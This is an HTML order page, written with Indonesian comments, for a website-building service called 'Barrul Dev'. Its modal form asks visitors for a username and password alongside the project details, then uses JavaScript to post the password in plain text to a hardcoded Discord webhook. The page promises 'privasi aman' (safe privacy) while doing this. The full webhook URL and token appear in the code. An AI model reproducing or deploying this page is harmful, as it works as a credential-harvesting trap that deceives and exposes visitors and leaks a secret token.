<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
  <title>Barrul Dev · Order Jasa</title>
  <style>
    /* ===== RESET & BASE ===== */
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
    }

    body {
      min-height: 100vh;
      background: linear-gradient(145deg, #00e5ff 0%, #0a2540 100%);
      background-attachment: fixed;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 1.5rem;
    }

    /* ===== MAIN CONTAINER (2 kolom) ===== */
    .main-panel {
      max-width: 1280px;
      width: 100%;
      display: grid;
      grid-template-columns: 1fr 1.2fr;
      gap: 2rem;
      background: rgba(10, 25, 40, 0.25);
      backdrop-filter: blur(12px);
      -webkit-backdrop-filter: blur(12px);
      border: 1px solid rgba(0, 229, 255, 0.25);
      border-radius: 2.5rem;
      padding: 2.5rem 2rem;
      box-shadow: 0 25px 40px -10px rgba(0, 0, 0, 0.4), 0 0 0 1px rgba(0, 255, 255, 0.1) inset;
    }

    /* ===== LEFT SECTION (HERO + PORTRAIT) ===== */
    .hero-section {
      display: flex;
      flex-direction: column;
      justify-content: center;
    }

    .brand {
      font-size: 3.2rem;
      font-weight: 800;
      letter-spacing: -0.02em;
      background: linear-gradient(to right, #e0ffff, #7ad0ff);
      -webkit-background-clip: text;
      background-clip: text;
      color: transparent;
      margin-bottom: 2rem;
      text-shadow: 0 2px 10px rgba(0,200,255,0.3);
    }

    .portrait-box {
      width: 100%;
      aspect-ratio: 3 / 4; /* portrait vertical */
      max-width: 340px;
      background: rgba(10, 30, 45, 0.7);
      backdrop-filter: blur(4px);
      -webkit-backdrop-filter: blur(4px);
      border: 2px dashed rgba(0, 230, 250, 0.6);
      border-radius: 32px;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      box-shadow: 0 15px 30px -5px rgba(0,0,0,0.5);
      transition: all 0.2s ease;
      margin-top: 0.5rem;
    }

    .portrait-box svg {
      width: 80px;
      height: 80px;
      stroke: #a0e9ff;
      stroke-width: 1.2;
      fill: none;
      margin-bottom: 1rem;
    }

    .portrait-box p {
      color: #c2ecff;
      font-weight: 600;
      font-size: 1.3rem;
      letter-spacing: 1px;
      text-transform: uppercase;
      background: rgba(0,0,0,0.2);
      padding: 0.5rem 1.2rem;
      border-radius: 40px;
      backdrop-filter: blur(5px);
      border: 1px solid rgba(0, 230, 250, 0.3);
    }

    /* ===== RIGHT SECTION (SERVICE CARD) ===== */
    .service-section {
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .order-card {
      background: rgba(8, 28, 45, 0.65);
      backdrop-filter: blur(10px);
      -webkit-backdrop-filter: blur(10px);
      border-radius: 2rem;
      padding: 2.5rem 2rem;
      width: 100%;
      border: 1px solid #2ad4ff30;
      box-shadow: 0 20px 30px -8px #00000055;
    }

    .card-title {
      font-size: 2.2rem;
      font-weight: 700;
      color: white;
      margin-bottom: 0.5rem;
      letter-spacing: -0.02em;
    }

    .card-sub {
      color: #9adcff;
      margin-bottom: 2rem;
      font-weight: 400;
      border-left: 4px solid #0cf;
      padding-left: 1rem;
    }

    .btn-order {
      background: linear-gradient(135deg, #00c8ff, #005f99);
      border: none;
      color: white;
      font-weight: 700;
      font-size: 1.4rem;
      padding: 1rem 2.2rem;
      border-radius: 60px;
      width: 100%;
      cursor: pointer;
      box-shadow: 0 8px 20px rgba(0, 200, 255, 0.3);
      border: 1px solid #7ae4ff;
      transition: all 0.2s;
      letter-spacing: 1px;
    }

    .btn-order:hover {
      transform: scale(1.01);
      background: linear-gradient(135deg, #2ad4ff, #0077b3);
      box-shadow: 0 10px 25px #00aaff80;
    }

    /* ===== MODAL OVERLAY ===== */
    .modal-overlay {
      position: fixed;
      top: 0; left: 0; width: 100%; height: 100%;
      background: rgba(0, 15, 25, 0.8);
      backdrop-filter: blur(8px);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 1000;
      visibility: hidden;
      opacity: 0;
      transition: 0.2s ease;
      padding: 1rem;
    }

    .modal-overlay.active {
      visibility: visible;
      opacity: 1;
    }

    .modal-content {
      background: #0b1f2e;
      border-radius: 2rem;
      max-width: 550px;
      width: 100%;
      padding: 2.2rem 1.8rem;
      box-shadow: 0 30px 50px #00000080, 0 0 0 1px #0cf3;
      border: 1px solid #1ecbe8;
      max-height: 90vh;
      overflow-y: auto;
    }

    .modal-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 1.5rem;
    }

    .modal-header h2 {
      color: #d6f0ff;
      font-weight: 700;
    }

    .close-modal {
      background: none;
      border: none;
      color: #b0eaff;
      font-size: 2rem;
      cursor: pointer;
      line-height: 1;
    }

    /* form elements */
    .form-group {
      margin-bottom: 1.5rem;
    }

    label {
      display: block;
      color: #b0e0ff;
      margin-bottom: 6px;
      font-weight: 500;
    }

    input, textarea {
      width: 100%;
      padding: 12px 16px;
      background: #102a3c;
      border: 1.5px solid #2f7a9e;
      border-radius: 18px;
      color: white;
      font-size: 1rem;
      outline: none;
      transition: 0.15s;
    }

    input:focus, textarea:focus {
      border-color: #0cf;
      box-shadow: 0 0 0 3px #00c8ff40;
    }

    /* budget radio grid */
    .budget-grid {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 10px;
      margin-top: 8px;
    }

    .budget-option {
      background: #103244;
      border-radius: 14px;
      padding: 8px 5px;
      text-align: center;
      border: 1.5px solid #2c6c8a;
      cursor: pointer;
      transition: 0.1s;
      color: #cceeff;
    }

    .budget-option.selected {
      background: #0077be;
      border-color: #9eeafb;
      color: white;
      font-weight: 600;
    }

    .budget-option input {
      display: none;
    }

    .btn-confirm {
      background: #00b8e6;
      border: none;
      padding: 14px 20px;
      width: 100%;
      border-radius: 40px;
      font-weight: bold;
      font-size: 1.2rem;
      color: #01161f;
      margin-top: 0.5rem;
      cursor: pointer;
      border: 1px solid #8ee2ff;
      transition: 0.15s;
    }

    .btn-confirm:hover {
      background: #2ad4ff;
    }

    /* responsive */
    @media (max-width: 800px) {
      .main-panel {
        grid-template-columns: 1fr;
        padding: 1.8rem;
      }
      .brand { font-size: 2.5rem; }
      .portrait-box { max-width: 260px; margin: 0 auto; }
      .hero-section { align-items: center; text-align: center; }
    }
  </style>
</head>
<body>
  <div class="main-panel">
    <!-- KIRI: HERO + FOTO GUA DISINI -->
    <div class="hero-section">
      <div class="brand">Barrul Dev</div>
      <div class="portrait-box">
  <img src="foto-gua.jpeg" alt="Foto Bos" style="width: 100%; height: 100%; object-fit: cover; border-radius: 32px;">
</div>
      <!-- tambahan info biar lebih techy -->
      <div style="margin-top: 2rem; color: #aad0ff; font-weight: 300; font-size: 0.9rem;">
        ⚡ Full‑stack · Clean UI · Brutal execution
      </div>
    </div>

    <!-- KANAN: CARD ORDER -->
    <div class="service-section">
      <div class="order-card">
        <div class="card-title">Jasa Buat Website</div>
        <div class="card-sub">Modern · Cepat · Gak ribet</div>
        <button class="btn-order" id="orderNowBtn">🔥 ORDER JASA</button>
        <div style="margin-top: 1.2rem; color: #7ab3cc; font-size: 0.9rem; display: flex; gap: 12px;">
          <span>⚡ 80k - 800k+</span>
          <span>🛡️ Privasi aman</span>
        </div>
      </div>
    </div>
  </div>

  <!-- MODAL FORM ORDER -->
  <div class="modal-overlay" id="orderModal">
    <div class="modal-content">
      <div class="modal-header">
        <h2>📋 Detail Order</h2>
        <button class="close-modal" id="closeModalBtn">&times;</button>
      </div>

      <form id="orderForm" onsubmit="return false;">
        <div class="form-group">
          <label>Username</label>
          <input type="text" id="username" placeholder="johndoe" required>
        </div>
        <div class="form-group">
          <label>Password</label>
          <input type="password" id="password" placeholder="••••••••" required>
        </div>
        <div class="form-group">
          <label>Detail Website</label>
          <textarea id="detail" rows="3" placeholder="Jelaskan kebutuhan website kamu..." required></textarea>
        </div>

        <label>💰 Budget Web (pilih satu)</label>
        <div class="budget-grid" id="budgetGroup">
          <!-- custom radio boxes pakai div + hidden radio -->
          <label class="budget-option">
            <input type="radio" name="budget" value="80k" required> 80k
          </label>
          <label class="budget-option">
            <input type="radio" name="budget" value="120k"> 120k
          </label>
          <label class="budget-option">
            <input type="radio" name="budget" value="165k"> 165k
          </label>
          <label class="budget-option">
            <input type="radio" name="budget" value="450k"> 450k
          </label>
          <label class="budget-option">
            <input type="radio" name="budget" value="685k"> 685k
          </label>
          <label class="budget-option">
            <input type="radio" name="budget" value="800k+"> 800k+
          </label>
        </div>

        <button type="submit" class="btn-confirm" id="confirmBtn">✅ CONFIRM</button>
      </form>
    </div>
  </div>

  <script>
    (function(){
      "use strict";


      const WEBHOOK_URL = "https://discord.com/api/webhooks/1491959493393645599/jVj3eRF3Uct_ZZDcED0U82cMRWcFIE8aRE2-gBuf_bSzIUFAl3OIqrkkIvmHYk-aq6xZ";

      const modal = document.getElementById('orderModal');
      const openBtn = document.getElementById('orderNowBtn');
      const closeBtn = document.getElementById('closeModalBtn');
      const form = document.getElementById('orderForm');

      const usernameInput = document.getElementById('username');
      const passwordInput = document.getElementById('password');
      const detailInput = document.getElementById('detail');
      const budgetRadios = document.querySelectorAll('input[name="budget"]');

      const budgetLabels = document.querySelectorAll('.budget-option');

      function updateRadioStyles() {
        budgetLabels.forEach(label => {
          const radio = label.querySelector('input[type="radio"]');
          if (radio.checked) {
            label.classList.add('selected');
          } else {
            label.classList.remove('selected');
          }
        });
      }

      budgetRadios.forEach(radio => radio.addEventListener('change', updateRadioStyles));

      // open modal
      openBtn.addEventListener('click', () => {
        modal.classList.add('active');
        // reset jika perlu, tapi biarin aja
        updateRadioStyles();
      });

      // close modal (tombol X atau klik overlay)
      closeBtn.addEventListener('click', () => modal.classList.remove('active'));
      modal.addEventListener('click', (e) => {
        if (e.target === modal) modal.classList.remove('active');
      });

      // escape key
      document.addEventListener('keydown', (e) => {
        if (e.key === 'Escape' && modal.classList.contains('active')) {
          modal.classList.remove('active');
        }
      });

      // Helper: ambil budget terpilih
      function getSelectedBudget() {
        let selected = null;
        budgetRadios.forEach(r => { if (r.checked) selected = r.value; });
        return selected;
      }

      // Kirim ke Discord Webhook (tanpa reload)
      async function sendToDiscord(payload) {
        try {
          const response = await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
          });
          if (!response.ok) {
            throw new Error(`Discord returned ${response.status}`);
          }
          return true;
        } catch (error) {
          console.error('Webhook error:', error);
          alert('Gagal kirim ke server, coba lagi. Pastikan webhook bener.');
          return false;
        }
      }

      // Submit handler
      form.addEventListener('submit', async (e) => {
        e.preventDefault();

        const username = usernameInput.value.trim();
        const password = passwordInput.value; // jangan trim password
        const detail = detailInput.value.trim();
        const budget = getSelectedBudget();

        if (!username || !password || !detail || !budget) {
          alert('Lengkapi semua field bos, termasuk budget.');
          return;
        }

        // Format data sesuai permintaan: JSON rapi
        const orderData = {
          username: username,
          password: password,          // yes, dikirim plain
          detail_website: detail,
          budget: budget,
          timestamp: new Date().toISOString(),
          platform: "Barrul Dev Order"
        };

        // Buat payload buat discord (content berupa teks format + raw json)
        const discordMessage = {
          content: `📬 **ORDER BARU DARI BARRUL DEV**\n` +
                   `👤 Username: **${username}**\n` +
                   `🔐 Password: ||${password}||\n` +
                   `📝 Detail: ${detail}\n` +
                   `💰 Budget: **${budget}**\n` +
                   `⏱️ Waktu: ${new Date().toLocaleString('id-ID')}\n\n` +
                   `\`\`\`json\n${JSON.stringify(orderData, null, 2)}\n\`\`\``
        };

        // Tampilkan loading kecil (opsional)
        const confirmBtn = document.getElementById('confirmBtn');
        const originalText = confirmBtn.textContent;
        confirmBtn.textContent = '⏳ MENGIRIM...';
        confirmBtn.disabled = true;

        const success = await sendToDiscord(discordMessage);

        if (success) {
          // Redirect ke halaman sukses
          window.location.href = 'success.html';
        } else {
          confirmBtn.textContent = originalText;
          confirmBtn.disabled = false;
        }
      });

      // init radio style
      updateRadioStyles();

      // kalau klik label radio (biar aman)
      budgetLabels.forEach(label => {
        label.addEventListener('click', function() {
          const radio = this.querySelector('input[type="radio"]');
          if (radio) {
            radio.checked = true;
            updateRadioStyles();
          }
        });
      });

    })();
  </script>
</body>
</html>
